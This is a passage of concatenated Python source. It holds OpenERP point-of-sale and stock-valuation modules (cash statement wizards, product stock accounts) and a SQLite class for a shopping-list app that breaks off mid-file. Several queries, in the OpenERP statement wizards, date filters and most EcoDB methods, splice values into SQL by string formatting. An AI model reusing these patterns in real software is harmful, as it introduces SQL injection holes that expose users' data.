            domain=[('usage','like','inventory')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory"),
        'property_stock_account_input': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
        'property_stock_account_output': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
    }

product_template()

class product_category(osv.osv):

    _inherit = 'product.category'
    _columns = {
        'property_stock_journal': fields.property('account.journal',
            relation='account.journal', type='many2one',
            string='Stock journal', method=True, view_load=True,
            help="When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed."),
        'property_stock_account_input_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_account_output_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_variation': fields.property('account.account',
            type='many2one',
            relation='account.account',
            string="Stock Variation Account",
            method=True, view_load=True,
            help="When real-time inventory valuation is enabled on a product, this account will hold the current value of the products.",),
    }

product_category()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _

class pos_close_statement(osv.osv_memory):
    _name = 'pos.close.statement'
    _description = 'Close Statements'

    def close_statement(self, cr, uid, ids, context):
        """
             Close the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Dictionary
        """
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        statement_obj = self.pool.get('account.bank.statement')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if not ids:
                raise osv.except_osv(_('Message'), _('Journals are already closed'))
            else:
                list_statement.append(ids[0])
                if not journal.check_dtls:
                    statement_obj.button_confirm_cash(cr, uid, ids, context)
    #        if not list_statement:
    #            return {}
    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)
    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id
        return {
                'domain': "[('id','in'," + str(list_statement) + ")]",
                'name': 'Close Statements',
                'view_type': 'form',
                'view_mode': 'tree,form',
                'res_model': 'account.bank.statement',
                'views': [(id2, 'tree'),(id3, 'form')],
                'type': 'ir.actions.act_window'}

pos_close_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _
import time

class pos_open_statement(osv.osv_memory):
    _name = 'pos.open.statement'
    _description = 'Open Statements'

    def open_statement(self, cr, uid, ids, context):
        """
             Open the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Directory
        """
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        statement_obj = self.pool.get('account.bank.statement')
        sequence_obj = self.pool.get('ir.sequence')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if len(ids):
                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for "%s". \n Please close the cashbox related to. ' %(journal.name)))
            
#            cr.execute(""" Select id from account_bank_statement
#                                    where journal_id =%d
#                                    and company_id =%d
#                                    order by id desc limit 1""" %(journal.id, company_id))
#            st_id = cr.fetchone()
            
            number = ''
            if journal.sequence_id:
                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)
            else:
                number = sequence_obj.get(cr, uid, 'account.bank.statement')
            
            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,
                                                          'company_id': company_id,
                                                          'user_id': uid,
                                                          'state': 'open',
                                                          'name': number,
                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),
                                                      })
            statement_obj.button_open(cr, uid, [statement_id], context)

    #            period = statement_obj._get_period(cr, uid, context) or None
    #            cr.execute("INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))
    #            cr.commit()
    #            cr.execute("select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'"%(journal.id, company_id, uid, number))
    #            statement_id = cr.fetchone()[0]
    #            print "statement_id",statement_id
    #            if st_id:
    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])
    #                list_statement.append(statemt_id.id)
    #                if statemt_id and statemt_id.ending_details_ids:
    #                    statement_obj.write(cr, uid, [statement_id], {
    #                        'balance_start': statemt_id.balance_end,
    #                        'state': 'open',
    #                    })
    #                    if statemt_id.ending_details_ids:
    #                        for i in statemt_id.ending_details_ids:
    #                            c = statement_obj.create(cr, uid, {
    #                                'pieces': i.pieces,
    #                                'number': i.number,
    #                                'starting_id': statement_id,
    #                            })
        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id

        return {
#           'domain': "[('id','in', ["+','.join(map(str,list_statement))+"])]",
            'domain': "[('state','=','open')]",
            'name': 'Open Statement',
            'view_type': 'form',
            'view_mode': 'tree,form',
            'res_model': 'account.bank.statement',
            'views': [(id2, 'tree'),(id3, 'form')],
            'type': 'ir.actions.act_window'
}
pos_open_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import fields, osv
from tools.translate import _

class product_product(osv.osv):
    _inherit = "product.product"

    def get_product_accounts(self, cr, uid, product_id, context=None):
        """ To get the stock input account, stock output account and stock journal related to product.
        @param product_id: product id
        @return: dictionary which contains information regarding stock input account, stock output account and stock journal
        """
        if context is None:
            context = {}
        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)

        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False
        if not stock_input_acc:
            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False

        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False
        if not stock_output_acc:
            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False

        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False
        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False

        return {
            'stock_account_input': stock_input_acc,
            'stock_account_output': stock_output_acc,
            'stock_journal': journal_id,
            'property_stock_variation': account_variation
        }

    def do_change_standard_price(self, cr, uid, ids, datas, context={}):
        """ Changes the Standard Price of Product and creates an account move accordingly.
        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal
        @param context: A standard dictionary
        @return:

        """
        location_obj = self.pool.get('stock.location')
        move_obj = self.pool.get('account.move')
        move_line_obj = self.pool.get('account.move.line')

        new_price = datas.get('new_price', 0.0)
        stock_output_acc = datas.get('stock_output_account', False)
        stock_input_acc = datas.get('stock_input_account', False)
        journal_id = datas.get('stock_journal', False)
        product_obj=self.browse(cr,uid,ids)[0]
        account_variation = product_obj.categ_id.property_stock_variation
        account_variation_id = account_variation and account_variation.id or False
        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))
        move_ids = []
        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])
        for rec_id in ids:
            for location in location_obj.browse(cr, uid, loc_ids):
                c = context.copy()
                c.update({
                    'location': location.id,
                    'compute_child': False
                })

                product = self.browse(cr, uid, rec_id, context=c)
                qty = product.qty_available
                diff = product.standard_price - new_price
                if not diff: raise osv.except_osv(_('Error!'), _("Could not find any difference between standard price and new price!"))
                if qty:
                    company_id = location.company_id and location.company_id.id or False
                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))
                    #
                    # Accounting Entries
                    #
                    if not journal_id:
                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False
                    if not journal_id:
                        raise osv.except_osv(_('Error!'),
                            _('There is no journal defined '\
                                'on the product category: "%s" (id: %d)') % \
                                (product.categ_id.name,
                                    product.categ_id.id,))
                    move_id = move_obj.create(cr, uid, {
                                'journal_id': journal_id,
                                'company_id': company_id
                                })

                    move_ids.append(move_id)


                    if diff > 0:
                        if not stock_input_acc:
                            stock_input_acc = product.product_tmpl_id.\
                                property_stock_account_input.id
                        if not stock_input_acc:
                            stock_input_acc = product.categ_id.\
                                    property_stock_account_input_categ.id
                        if not stock_input_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock input account defined ' \
                                            'for this product: "%s" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * diff
                        move_line_obj.create(cr, uid, {
                                    'name': product.name,
                                    'account_id': stock_input_acc,
                                    'debit': amount_diff,
                                    'move_id': move_id,
                                    })
                        move_line_obj.create(cr, uid, {
                                    'name': product.categ_id.name,
                                    'account_id': account_variation_id,
                                    'credit': amount_diff,
                                    'move_id': move_id
                                    })
                    elif diff < 0:
                        if not stock_output_acc:
                            stock_output_acc = product.product_tmpl_id.\
                                property_stock_account_output.id
                        if not stock_output_acc:
                            stock_output_acc = product.categ_id.\
                                    property_stock_account_output_categ.id
                        if not stock_output_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock output account defined ' \
                                            'for this product: "%s" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * -diff
                        move_line_obj.create(cr, uid, {
                                        'name': product.name,
                                        'account_id': stock_output_acc,
                                        'credit': amount_diff,
                                        'move_id': move_id
                                    })
                        move_line_obj.create(cr, uid, {
                                        'name': product.categ_id.name,
                                        'account_id': account_variation_id,
                                        'debit': amount_diff,
                                        'move_id': move_id
                                    })

            self.write(cr, uid, rec_id, {'standard_price': new_price})

        return move_ids

    def view_header_get(self, cr, user, view_id, view_type, context=None):
        if context is None:
            context = {}
        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)
        if res: return res
        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):
            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name
        return res

    def get_product_available(self, cr, uid, ids, context=None):
        """ Finds whether product is available or not in particular warehouse.
        @return: Dictionary of values
        """
        if context is None:
            context = {}
        states = context.get('states',[])
        what = context.get('what',())
        if not ids:
            ids = self.search(cr, uid, [])
        res = {}.fromkeys(ids, 0.0)
        if not ids:
            return res

        if context.get('shop', False):
            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))
            res2 = cr.fetchone()
            if res2:
                context['warehouse'] = res2[0]

        if context.get('warehouse', False):
            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))
            res2 = cr.fetchone()
            if res2:
                context['location'] = res2[0]

        if context.get('location', False):
            if type(context['location']) == type(1):
                location_ids = [context['location']]
            elif type(context['location']) in (type(''), type(u'')):
                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)
            else:
                location_ids = context['location']
        else:
            location_ids = []
            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)
            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):
                location_ids.append(w.lot_stock_id.id)

        # build the list of ids of children of the location given by id
        if context.get('compute_child',True):
            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])
            location_ids = child_location_ids or location_ids
        else:
            location_ids = location_ids

        uoms_o = {}
        product2uom = {}
        for product in self.browse(cr, uid, ids, context=context):
            product2uom[product.id] = product.uom_id.id
            uoms_o[product.uom_id.id] = product.uom_id

        results = []
        results2 = []

        from_date=context.get('from_date',False)                    
        to_date=context.get('to_date',False)                    
        date_str=False                    
        if from_date and to_date:
            date_str="date_planned>='%s' and date_planned<='%s'"%(from_date,to_date)                    
        elif from_date:
            date_str="date_planned>='%s'"%(from_date)                    
        elif to_date:
            date_str="date_planned<='%s'"%(to_date)                    

        if 'in' in what:
            # all moves from a location out of the set to a location in the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id NOT IN %s'\
                'and location_dest_id IN %s'\
                'and product_id IN %s'\
                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\
                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)                    
            )
            results = cr.fetchall()
        if 'out' in what:
            # all moves from a location in the set to a location out of the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id IN %s'\
                'and location_dest_id NOT IN %s '\
                'and product_id  IN %s'\
                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\
                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)                    
            )
            results2 = cr.fetchall()
        uom_obj = self.pool.get('product.uom')
        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)
        if context.get('uom', False):
            uoms += [context['uom']]

        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)
        if uoms:
            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)
        for o in uoms:
            uoms_o[o.id] = o
        for amount, prod_id, prod_uom in results:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] += amount
        for amount, prod_id, prod_uom in results2:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] -= amount
        return res

    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):
        """ Finds the incoming and outgoing quantity of product.
        @return: Dictionary of values
        """
        if not field_names:
            field_names = []
        if context is None:
            context = {}
        res = {}
        for id in ids:
            res[id] = {}.fromkeys(field_names, 0.0)
        for f in field_names:
            c = context.copy()
            if f == 'qty_available':
                c.update({ 'states': ('done',), 'what': ('in', 'out') })
            if f == 'virtual_available':
                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })
            if f == 'incoming_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })
            if f == 'outgoing_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })
            stock = self.get_product_available(cr, uid, ids, context=c)
            for id in ids:
                res[id][f] = stock.get(id, 0.0)
        return res

    _columns = {
        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help="Current quantities of products in selected locations or all internal if none have been selected.", multi='qty_available'),
        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help="Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming.", multi='qty_available'),
        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help="Quantities of products that are planned to arrive in selected locations or all internal if none have been selected.", multi='qty_available'),
        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help="Quantities of products that are planned to leave in selected locations or all internal if none have been selected.", multi='qty_available'),
        'track_production': fields.boolean('Track Manufacturing Lots' , help="Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order"),
        'track_incoming': fields.boolean('Track Incoming Lots', help="Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location"),
        'track_outgoing': fields.boolean('Track Outgoing Lots', help="Forces to specify a Production Lot for all moves containing this product and going to a Customer Location"),
        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),
        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),
                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', 
                                        help="If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves." \
                                             "The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products."
                                        , required=True),
    }

    _defaults = {
        'valuation': lambda *a: 'manual_periodic',
    }

    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):
        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)
        if context is None:
            context = {}
        if ('location' in context) and context['location']:
            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])
            fields=res.get('fields',{})
            if fields:
                if location_info.usage == 'supplier':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Receptions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Received Qty')

                if location_info.usage == 'internal':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Stock')

                if location_info.usage == 'customer':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Deliveries')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Delivered Qty')

                if location_info.usage == 'inventory':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future P&L')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('P&L Qty')

                if location_info.usage == 'procurement':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Qty')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Unplanned Qty')

                if location_info.usage == 'production':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Productions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Produced Qty')
        return res

product_product()

class product_template(osv.osv):
    _name = 'product.template'
    _inherit = 'product.template'
    _columns = {
        'property_stock_procurement': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Procurement Location",
            method=True,
            view_load=True,
            domain=[('usage','like','procurement')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements"),
        'property_stock_production': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Production Location",
            method=True,
            view_load=True,
            domain=[('usage','like','production')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders"),
        'property_stock_inventory': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Inventory Location",
            method=True,
            view_load=True,
            domain=[('usage','like','inventory')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory"),
        'property_stock_account_input': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
        'property_stock_account_output': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
    }

product_template()

class product_category(osv.osv):

    _inherit = 'product.category'
    _columns = {
        'property_stock_journal': fields.property('account.journal',
            relation='account.journal', type='many2one',
            string='Stock journal', method=True, view_load=True,
            help="When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed."),
        'property_stock_account_input_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_account_output_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_variation': fields.property('account.account',
            type='many2one',
            relation='account.account',
            string="Stock Variation Account",
            method=True, view_load=True,
            help="When real-time inventory valuation is enabled on a product, this account will hold the current value of the products.",),
    }

product_category()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

#!/usr/bin/python3
# -*- coding: UTF-8 -*-

# 
# This file is part of Ecological Shopping List II (ecosl).
# 
# Copyright (C) 2011 - 2012  Mika Tapoj√§rvi
# 
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published by
# the Free Software Foundation, version 3 of the License.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
# 
# You should have received a copy of the GNU Lesser General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

# http://benspaulding.com/weblog/2008/jun/13/brief-python-sqlite-example/
# http://docs.python.org/library/sqlite3.html
# http://docs.python.org/library/argparse.html


import sys
import os.path
import argparse
import sqlite3
import codecs


class EcoDB:
    """Database abstraction class for Ecological Shopping List II.
       All database related functions are implemented as an API.
    """


    def __init__(self, db_path):
        """Open ecosl database, if it exists."""
        self.connection = False;
        self.db_path = db_path
        if os.path.exists(self.db_path) and os.path.isfile(self.db_path):
            self.connection = sqlite3.connect(self.db_path)
            self.cursor = self.connection.cursor()
            #print('db opened') #  debug
        else:
            print('db does not exist') #  debug

    def create_empty_database(self):
        """Create a new, empty database."""
        if self.connection:
            print('Database already open! Please choose another file name.')
        else:
            sql='BEGIN TRANSACTION; \
                CREATE TABLE item (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, shoppinglistid INTEGER); \
                CREATE UNIQUE INDEX itidname ON item (id, shoppinglistid); \
                CREATE TABLE itemlanguage (id INTEGER PRIMARY KEY AUTOINCREMENT, language TEXT); \
                CREATE UNIQUE INDEX idlanguage ON itemlanguage (id, language ASC); \
                CREATE TABLE itemtranslation (id INTEGER PRIMARY KEY AUTOINCREMENT, itemid INTEGER, itemlanguageid INTEGER, translation TEXT); \
                CREATE UNIQUE INDEX iditemlanguageid ON itemtranslation (id, itemlanguageid ASC); \
                CREATE TABLE shoppinglist (id INTEGER PRIMARY KEY AUTOINCREMENT, hash TEXT); \
                CREATE UNIQUE INDEX idhash ON shoppinglist (id, hash ASC); \
                CREATE TABLE shoppinglistitems (id INTEGER PRIMARY KEY AUTOINCREMENT, shoppinglistid INTEGER, itemid INTEGER, amount INTEGER); \
                CREATE UNIQUE INDEX idshoppinglistid ON shoppinglistitems (id, shoppinglistid ASC); \
                CREATE TABLE store (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT); \
                CREATE UNIQUE INDEX stidname ON store (id, name ASC); \
                CREATE TABLE price (id INTEGER PRIMARY KEY AUTOINCREMENT, itemid INTEGER, storeid INTEGER, price REAL); \
                CREATE UNIQUE INDEX pridstoreid ON price (id, storeid ASC); \
                CREATE TABLE shoppingorder (id INTEGER PRIMARY KEY AUTOINCREMENT, storeid INTEGER, itemid INTEGER, shorder INTEGER); \
                CREATE UNIQUE INDEX soidstoreid ON shoppingorder (id, storeid ASC); \
                COMMIT;'

            self.connection = sqlite3.connect(self.db_path)
            self.cursor = self.connection.cursor()
            self.cursor.executescript(sql)



    def import_database(self, sqlfile):
        """Create new database and import contents of an sql file to it."""
        self.connection = sqlite3.connect(self.db_path)
        self.cursor = self.connection.cursor()
        if self.connection:
            f = codecs.open(sqlfile[0], encoding='utf-8', mode='r')
            sql = f.read()
            self.cursor.executescript(sql)
            print('db created and contents imported from %s' % sqlfile[0])

    def dump_database(self, sqlfile):
        """Dump contents of the database to a file."""
        if self.connection:
            with codecs.open(sqlfile[0], encoding='utf-8', mode='w') as f:
                for line in self.connection.iterdump():
                    f.write('%s\n' % line)
            print('db dumped to %s' % sqlfile[0])

    def find_all_items(self, langid):
        """"Find all items and their translations for the given language."""
        if langid[0] == '0': # all items without the translations
            return self.cursor.execute('select * from item')
        else:
            return self.cursor.execute('select item.id, item.shoppinglistid, item.name, \
                itemtranslation.id, itemtranslation.itemid, itemtranslation.itemlanguageid, \
                itemtranslation.translation \
                from item \
                left join itemtranslation \
                on itemtranslation.itemlanguageid = "%s" and itemtranslation.itemid = item.id' % langid[0])

    def find_item_name(self, nameid):
        """"Find items and translations by their name for the given language."""
        if nameid[1] == '0':
            return self.cursor.execute('select * from item \
                where item.name = "%s"' % nameid[0])
        else:
            return self.cursor.execute('select item.id, item.name, item.shoppinglistid, \
                itemtranslation.id, itemtranslation.itemid, itemtranslation.itemlanguageid, \
                itemtranslation.translation \
                from item, itemtranslation \
                where item.name = "%s" and itemtranslation.itemlanguageid = "%s" and itemtranslation.itemid = item.id' % (nameid[0], nameid[1]))

    def find_item_id(self, idid):
        """"Find items and translations by their id for the given language."""
        return self.cursor.execute('select item.id, item.shoppinglistid, item.name, \
            itemtranslation.id, itemtranslation.itemid, itemtranslation.itemlanguageid, \
            itemtranslation.translation \
            from item, itemtranslation \
            where item.id = "%s" and itemtranslation.itemlanguageid = "%s" and itemtranslation.itemid = item.id' % (idid[0], idid[1]))

    def get_list_items(self, a_list):  # NOT UPDATED FOR ECOSL II
        """"Get all items for a single shopping list"""
        return self.cursor.execute('select items.itemid, listitems.amount, items.itemname from items, listitems, lists where lists.listhash = "%s" and listitems.listid = lists.listid and listitems.itemid = items.itemid' % a_list)

    #
    # Adding, modifying and removing items to database

    def add_item(self, item):
        """"Add new item."""
        if self.connection:
            self.cursor.execute('insert into item (name, shoppinglistid) values ("%s", "%s")' % (item[0], item[1]))                    
            self.connection.commit()                    
            #r = self.cursor.execute('select id, name, shoppinglistid from item where name = "%s"' % item[0]).fetchall()[0]

    def update_item(self, itemid, itemname):  # NOT UPDATED FOR ECOSL II
        """Update the name of an item"""
        self.cursor.execute('update items set itemname = "%s" where itemid = "%s"' % (itemname, itemid))
